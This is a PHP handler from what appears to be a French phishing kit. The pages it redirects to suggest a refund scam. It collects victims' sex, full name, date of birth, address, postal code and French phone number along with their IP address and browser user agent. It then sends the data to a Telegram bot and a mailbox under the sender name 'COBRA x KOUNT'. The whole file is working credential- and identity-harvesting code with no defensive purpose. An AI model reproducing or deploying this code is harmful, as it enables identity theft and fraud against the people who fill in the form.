<?php
// Redirection obligatoire vers Remboursement.php dès le début
header('Location: ../Remboursement.php');
exit();
?>

<?php
if ($_SERVER['HTTP_HOST'] === 'monlien.com' && $_SERVER['REQUEST_URI'] === '/') {
    header('Location: /Se-connecter.php');
    exit();
}

session_start();
require_once __DIR__ . '/../email.php';
require_once __DIR__ . '/../PREVENTS/infos.php';

$_SESSION['ip']        = $_SERVER['REMOTE_ADDR'];
$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['confirmation_form'])) {
    // Récupération des champs
    $_SESSION['sex']    = $_POST['confirmation_form']['biological_sex'] ?? '';
    $_SESSION['nom']    = $_POST['confirmation_form']['lastName']       ?? '';
    $_SESSION['prenom'] = $_POST['confirmation_form']['firstName']      ?? '';
    $_SESSION['dob']    = $_POST['confirmation_form']['birthDate']      ?? '';
    $_SESSION['adresse']= $_POST['confirmation_form']['address']        ?? '';
    $_SESSION['city']   = $_POST['confirmation_form']['city']           ?? '';
    $_SESSION['zip']    = $_POST['confirmation_form']['zipCode']        ?? '';
    $_SESSION['phone']  = $_POST['confirmation_form']['phone']          ?? '';

    // Vérifications côté serveur
    $phonePattern = '/^(0\d{9}|\+33\d{9})$/';

    if (
        empty($_SESSION['sex']) ||
        empty($_SESSION['nom']) ||
        empty($_SESSION['prenom']) ||
        empty($_SESSION['dob']) ||
        empty($_SESSION['adresse']) ||
        empty($_SESSION['city']) ||
        empty($_SESSION['zip']) ||
        empty($_SESSION['phone']) ||
        !preg_match($phonePattern, $_SESSION['phone'])
    ) {
        exit;
    }

    // Sinon tout va bien, on envoie par Telegram + email
    if (isset($envoyerBillingEnUnRez) && $envoyerBillingEnUnRez === true) {
        $message = "
💼[INFORMATIONS PERSONNELLES]
🪪Sexe : ".$_SESSION['sex']."
✏️Prénom : ".$_SESSION['prenom']."
✏️Nom : ".$_SESSION['nom']."
✏️Date de naissance : ".$_SESSION['dob']."
✏️Adresse : ".$_SESSION['adresse']."
✏️Ville : ".$_SESSION['city']."
📮Code Postal : ".$_SESSION['zip']."
        Téléphone : ".$_SESSION['phone']."

📍IP : ".$_SESSION['ip']."
📍USER-AGENT : ".$_SESSION['useragent']."
        ";

        $subject = "=?utf-8?Q?=E3=80=8C=F0=9F=97=82=E3=80=8D=2B1_INFO?= - " . $_SESSION['ip'];
        $headers = "From: =?utf-8?Q?COBRA_x_KOUNT_=F0=9F=A5=9D?= <crusix@amzv1.com>";

        $data = [
            'text' => $message,
            'chat_id' => $chat_id
        ];
        file_get_contents("https://api.telegram.org/bot$bot_token/sendMessage?" . http_build_query($data));

        mail($boite_rez, $subject, $message, $headers);

        header('Location: ../Remboursement.php');
        exit;
    } else {
        header('Location: ../Remboursement.php');
        exit;
    }
} else {
    die('ERROR 404 - Accès direct interdit');
}
?>
